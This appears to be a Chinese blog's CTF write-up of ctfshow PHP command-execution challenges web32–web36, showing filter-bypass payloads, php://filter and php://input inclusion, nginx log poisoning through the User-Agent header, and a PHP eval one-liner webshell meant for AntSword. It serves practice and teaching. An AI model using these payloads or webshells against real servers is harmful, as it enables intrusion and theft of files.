<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// get的键不带引号也可以执行</span></span><br><span class="line"><span class="comment">// 超全局数组本身返回的就是字符串，所以不需要引号包裹</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$GET_</span>[cmd];</span><br></pre></td></tr></table></figure>
<p>然后再新的键里面上传我们需要的指令，减少了限制</p>
<h2 id="下一步-5"><a href="#下一步-5" class="headerlink" title="下一步"></a>下一步</h2><p>我们确实找到了不依赖括号的函数，他是文件包含，我们要如何利用？<br>ToDo: 什么php函数没有括号？</p>
<ul>
<li>完成：文件包含函数，并且结合了新的键，绕过上传限制<br>ToDo: 怎么包含文件（单纯包含是不输出的，如果是对应php后缀的文件），包含什么文件，不过题目这里环境是默认本目录下的flag.php(当然我也有不依赖自己查找文件位置的方法，就是写入一句话木马)</li>
</ul>
<h3 id="使用php伪协议"><a href="#使用php伪协议" class="headerlink" title="使用php伪协议"></a>使用php伪协议</h3><p>文件包含，如果包含的是对应的代码文件是不会显示的（因为被执行了），所以需要编码的方式去显示，这里使用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>就可以获得文件的编码并且回显<br>有关php伪协议的文章<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园 (cnblogs.com)</a></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>ToDo: 什么php函数没有括号？</p>
<ul>
<li>完成：文件包含函数，并且结合了新的键，绕过上传限制<br>ToDo: 怎么包含文件（单纯包含是不输出的，如果是对应php后缀的文件），包含什么文件，不过题目这里环境是默认本目录下的flag.php(当然我也有不依赖自己查找文件位置的方法，就是写入一句话木马)</li>
<li>完成：使用php:&#x2F;&#x2F;filter<br>ToDo：最终的payload，注意过滤的符号<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>%<span class="number">09</span><span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[cmd]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span>%<span class="number">0</span>a<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]<span class="meta">?&gt;</span>&amp;cmd=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
解释一下每个符号的作用</li>
<li>空格<ul>
<li>%09 tab，可以起到空格的作用</li>
<li>%0a 换行符，注意在bash按下回车就是命令分隔，起不到空格的作用，这里是通过eval进入php代码执行，而php的执行需要以分号才作结，tab键能够起到分隔的作用</li>
<li>干脆不要符号，$_GET返回的结果能够被include识别，因为$能够标识变量，言下之意就是php分得清是在include一个变量返回的结果</li>
</ul>
</li>
<li>命令结束?&gt;<ul>
<li>由于我们是通过$_GET[c]传入eval执行的，也就是  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;include<span class="subst">$_GET</span>[&quot;</span>cmd<span class="string">&quot;]需要终结&quot;</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
  相当于嵌入一句php代码，但是这行代码需要一个php能够识别的结束符，分号已经被过滤了，我们可以使用php代码片段的结束符?&gt;让代码提前闭合，最后一行的php代码是不需要分号的,但是这样会让环境后面的代码被忽略，当然我们不依赖后面的代码去渗透</li>
</ul>
</li>
<li>超全局数组内部可以不用引号</li>
</ul>
<h2 id="另一种考虑，要是不知道读取文件的位置怎么办"><a href="#另一种考虑，要是不知道读取文件的位置怎么办" class="headerlink" title="另一种考虑，要是不知道读取文件的位置怎么办"></a>另一种考虑，要是不知道读取文件的位置怎么办</h2><p>如果能写入一句话木马，我们就可以使用强大的工具，antsword去getshell了！！！<br>ToDo:如何写入一句话木马</p>
<h3 id="直接在c参数传入一句话木马吗？"><a href="#直接在c参数传入一句话木马吗？" class="headerlink" title="直接在c参数传入一句话木马吗？"></a>直接在c参数传入一句话木马吗？</h3><p>括号被过滤了，这是没法用函数的发愁点，不妨学点别的方式去写入一句话木马</p>
<h3 id="仍然利用不使用括号的函数，文件包含代理中间件的日志文件，写入一句话木马"><a href="#仍然利用不使用括号的函数，文件包含代理中间件的日志文件，写入一句话木马" class="headerlink" title="仍然利用不使用括号的函数，文件包含代理中间件的日志文件，写入一句话木马"></a>仍然利用不使用括号的函数，文件包含代理中间件的日志文件，写入一句话木马</h3><p>大概解释下原理，服务器处理网络服务一般会使用中间件去代理网络流量，众所周知的就是nginx和apache，他们在系统中有固定的路径日志文件，这个文件会记录访问者的访问的url和时间等信息，这样可以在这个日志文本文件中包含一句话木马，通过文件包含到eval出就可以执行一句话木马，从而让antsword可以连接</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_15-44-25.png" class="" title="Clip_2024-09-25_15-44-25.png">
<p>http的server头是nginx，那么我们尝试写入nginx的访问日志文件</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_15-50-40.png" class="" title="Clip_2024-09-25_15-50-40.png">
<p>ToDo:如何写入一句话木马</p>
<ul>
<li>ToDo:如何在nginx访问日志文件中写入一句话木马</li>
</ul>
<h3 id="先把文件包含出来看看"><a href="#先把文件包含出来看看" class="headerlink" title="先把文件包含出来看看"></a>先把文件包含出来看看</h3><p>一开始nginx的访问日志肯定是不含php代码的，只是文本，因此包含出来的话肯定都是纯文本<br><del>?c&#x3D;include%0a”&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log”?&gt;</del></p>
<ul>
<li>本身c参数不能有.<br>绕过限制，我们直接写一个新的超全局数组<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_16-07-38.png" class="" title="Clip_2024-09-25_16-07-38.png">
当然这么乱要整理一下<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IP地址: 172.12.129.208 </span><br><span class="line">时间: 25/Sep/2024:07:59:44 +0000 </span><br><span class="line">请求类型: GET URL: </span><br><span class="line">/?c=include$_GET[1]%3E&amp;1=/var/log/nginx/access.log </span><br><span class="line">状态码: 200 </span><br><span class="line">响应大小: 2624 </span><br><span class="line">引用页面: - </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0</span><br></pre></td></tr></table></figure>
这就是其中的一个包含的信息</li>
</ul>
<h3 id="怎么通过访问就写入了木马了"><a href="#怎么通过访问就写入了木马了" class="headerlink" title="怎么通过访问就写入了木马了"></a>怎么通过访问就写入了木马了</h3><p>其中有两处的参数我们是可以控制的<br>一个是url里面我们可以包含一句话木马<br>或者我们在http的User-Agent头包含php的一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="不能看见我们的木马，哈哈！"><a href="#不能看见我们的木马，哈哈！" class="headerlink" title="不能看见我们的木马，哈哈！"></a>不能看见我们的木马，哈哈！</h3><p>如果选择在url中注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=/<span class="keyword">var</span>/log/nginx/access.log&amp;shell=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_18-44-57.png" class="" title="Clip_2024-09-25_18-44-57.png">
<p>怎么包含出来的日志文件显示了一句话木马，这说明没有当作php代码执行<br>细看，原来是特殊的符号都被url编码了，这应该是浏览器自动编码了，我们可以抓包自行修改避免浏览器自动编码<br>但是这道题的环境url出我尝试过很多种方法注入都不是很成功，所以在user-agent注入好了<br>最后木马是可以运行的，但是antsword连不上，不搞了，直接执行命令得了</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_19-48-42.png" class="" title="Clip_2024-09-25_19-48-42.png">
<h1 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(</span><br><span class="line">    !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-2"><a href="#环境说明-2" class="headerlink" title="环境说明"></a>环境说明</h2><p>过滤情况</p>
<ul>
<li>php函数<ul>
<li>system</li>
<li>shell_exec</li>
<li>echo</li>
</ul>
</li>
<li>bash函数<ul>
<li>echo</li>
<li>cat</li>
<li>sort</li>
</ul>
</li>
<li>符号<ul>
<li>.</li>
<li>‘</li>
<li>“</li>
<li>`</li>
<li>;</li>
<li>(</li>
<li>空格</li>
</ul>
</li>
<li>文件名<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
</ul>
<h2 id="解题过程同web32，使用伪协议或者写日志shell即可"><a href="#解题过程同web32，使用伪协议或者写日志shell即可" class="headerlink" title="解题过程同web32，使用伪协议或者写日志shell即可"></a>解题过程同web32，使用伪协议或者写日志shell即可</h2><h1 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h1><h2 id="解题过程同web32，只是多了一个冒号过滤，-符号才是这些方法的命根哈哈哈"><a href="#解题过程同web32，只是多了一个冒号过滤，-符号才是这些方法的命根哈哈哈" class="headerlink" title="解题过程同web32，只是多了一个冒号过滤，$符号才是这些方法的命根哈哈哈"></a>解题过程同web32，只是多了一个冒号过滤，$符号才是这些方法的命根哈哈哈</h2><h1 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-3"><a href="#环境说明-3" class="headerlink" title="环境说明"></a>环境说明</h2><p>过滤情况</p>
<ul>
<li>php函数<ul>
<li>system</li>
<li>shell_exec</li>
<li>echo</li>
</ul>
</li>
<li>bash函数<ul>
<li>echo</li>
<li>cat</li>
<li>sort</li>
</ul>
</li>
<li>符号<ul>
<li>.</li>
<li>‘</li>
<li>“</li>
<li>`</li>
<li>;</li>
<li>(</li>
<li>空格</li>
<li>&#x3D;</li>
<li>&lt;</li>
</ul>
</li>
<li>文件名<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
</ul>
<h2 id="下一步-6"><a href="#下一步-6" class="headerlink" title="下一步"></a>下一步</h2><p>虽然都是老样子可以直接老方法日志文件写入，但是我们想尽可能尝试所有的伪协议的方法<br>ToDo:使用data:&#x2F;&#x2F;text&#x2F;&#x2F;plain,&lt;?php 代码部分?&gt;<br>原理，借助文件包含函数，data伪协议可以写入php代码，并且执行，执行的原因是文件包含，不是eval注意<br>data伪协议使用方法</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-25_22-35-21.png" class="" title="Clip_2024-09-25_22-35-21.png">
<h2 id="下一步-7"><a href="#下一步-7" class="headerlink" title="下一步"></a>下一步</h2><p>ToDo:使用data:&#x2F;&#x2F;text&#x2F;&#x2F;plain,&lt;?php 代码部分?&gt;</p>
<ul>
<li>完成<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=include$_GET[cmd]?&gt;&amp;cmd=data://text//plain,&lt;?php system(&#x27;cat flag.php&#x27;)?&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="环境说明-4"><a href="#环境说明-4" class="headerlink" title="环境说明"></a>环境说明</h2><p>过滤情况</p>
<ul>
<li>php函数<ul>
<li>system</li>
<li>shell_exec</li>
<li>echo</li>
</ul>
</li>
<li>bash函数<ul>
<li>echo</li>
<li>cat</li>
<li>sort</li>
</ul>
</li>
<li>符号<ul>
<li>.</li>
<li>‘</li>
<li>“</li>
<li>`</li>
<li>;</li>
<li>(</li>
<li>空格</li>
<li>:</li>
<li>&lt;</li>
<li>&#x3D;</li>
<li>&#x2F;</li>
<li>所有数字字符</li>
</ul>
</li>
<li>文件名<ul>
<li>flag</li>
<li>php</li>
</ul>
</li>
</ul>
<h2 id="这次来用php-input伪协议来实现"><a href="#这次来用php-input伪协议来实现" class="headerlink" title="这次来用php:&#x2F;&#x2F;input伪协议来实现"></a>这次来用php:&#x2F;&#x2F;input伪协议来实现</h2><p>原理同样是因为include(php:&#x2F;&#x2F;input)的php代码被执行</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_00-26-26.png" class="" title="Clip_2024-09-26_00-26-26.png">
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post处上传php代码</span><br></pre></td></tr></table></figure>
<h2 id="下一步-8"><a href="#下一步-8" class="headerlink" title="下一步"></a>下一步</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注意这里的键不要用数字，禁用了数字，c的payload不能带数字</span></span><br><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">post</span><br><span class="line">b=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>值得注意的事项</p>
<ul>
<li>发送的时候post体只能有php代码<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_10-58-37.png" class="" title="Clip_2024-09-26_10-58-37.png"></li>
<li>hackerbar发送不成功，无法反应，因为没有post键，所以自行使用burp发包，注意php代码需要隔开一行<ul>
<li>不成功   <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-02-10.png" class="" title="Clip_2024-09-26_11-02-10.png"></li>
<li>成功  <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-02-25.png" class="" title="Clip_2024-09-26_11-02-25.png"></li>
</ul>
</li>
<li>如果想利用php:&#x2F;&#x2F;input写入一句话木马，连接蚁剑，post的代码部分首先需要自己手工发包一次，并且利用写入文件去在服务器位置写入文件木马，再连接蚁剑的时候进行包含木马文件再连接<ul>
<li>不成功<br>  没有写入木马，在不含post键的情况下直接上传一句话木马代码，返回数据为空  <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-07-42.png" class="" title="Clip_2024-09-26_11-07-42.png">
  <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-07-53.png" class="" title="Clip_2024-09-26_11-07-53.png"></li>
<li>预计成功，但是题目环境我没有成功写入文件<br>  参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84215240/article/details/138187551">Web漏洞-文件包含漏洞超详细全解（附实例）_【web漏洞百例】_文件包含漏洞的案例-CSDN博客</a>  <img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-09-57.png" class="" title="Clip_2024-09-26_11-09-57.png"></li>
</ul>
</li>
</ul>
<h2 id="最后的结果"><a href="#最后的结果" class="headerlink" title="最后的结果"></a>最后的结果</h2><p>我们认为还是使用php:&#x2F;&#x2F;input协议在burp里面抓包去执行php代码就行了，连接蚁剑还是会遇到以文件形式去写入木马的问题</p>
<img src="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/Clip_2024-09-26_11-21-00.png" class="" title="Clip_2024-09-26_11-21-00.png">

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/ctfshow-web%E5%85%A5%E9%97%A8%E7%B3%BB%E5%88%97-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-web29-web36/" data-id="cm1pwtvvq0001ecvh9dmn483b" data-title="ctfshow-web入门系列-命令执行-web29-web36" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-hack/ctfshow/web入门/命令执行/命令执行，命令执行的文件包含必看文章" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" class="article-date">
  <time class="dt-published" datetime="2024-10-01T03:59:00.000Z" itemprop="datePublished">2024-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/hack/">hack</a>►<a class="article-category-link" href="/categories/hack/ctfshow/">ctfshow</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/">web入门</a>►<a class="article-category-link" href="/categories/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/">命令执行，命令执行的文件包含必看文章</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="单纯的关键字问题"><a href="#单纯的关键字问题" class="headerlink" title="单纯的关键字问题"></a>单纯的关键字问题</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/meng-han/p/16735478.html">CTF之PHP命令执行 - hithub - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/319567.html">CTF中命令执行常用知识点总结 - FreeBuf网络安全行业门户</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45655564/article/details/117395152">命令注入————ctfhub（过滤cat、空格、目录分隔符、运算符、综合过滤练习）_ctfhub 命令注入-过滤空格-CSDN博客</a></p>
<h1 id="伪协议，文件包含"><a href="#伪协议，文件包含" class="headerlink" title="伪协议，文件包含"></a>伪协议，文件包含</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">php伪协议 - 看不尽的尘埃 - 博客园 (cnblogs.com)</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/2401_84215240/article/details/138187551">Web漏洞-文件包含漏洞超详细全解（附实例）_【web漏洞百例】_文件包含漏洞的案例-CSDN博客</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/01/hack/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%BF%85%E7%9C%8B%E6%96%87%E7%AB%A0/" data-id="cm1pwtvw4000mecvh4hg01j4t" data-title="命令执行，命令执行的文件包含必看文章" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
